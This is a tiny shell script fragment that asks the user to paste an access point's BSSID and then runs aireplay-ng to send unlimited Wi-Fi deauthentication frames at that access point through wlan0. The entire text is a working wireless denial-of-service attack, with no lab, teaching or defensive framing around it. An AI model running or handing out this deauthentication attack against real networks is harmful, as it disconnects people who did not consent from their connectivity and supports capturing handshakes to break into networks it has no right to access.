echo "PASTE YOUR PREVIOUS BSSID :  "
read ESSID2

sudo aireplay-ng --deauth 0 -a $ESSID2 wlan0
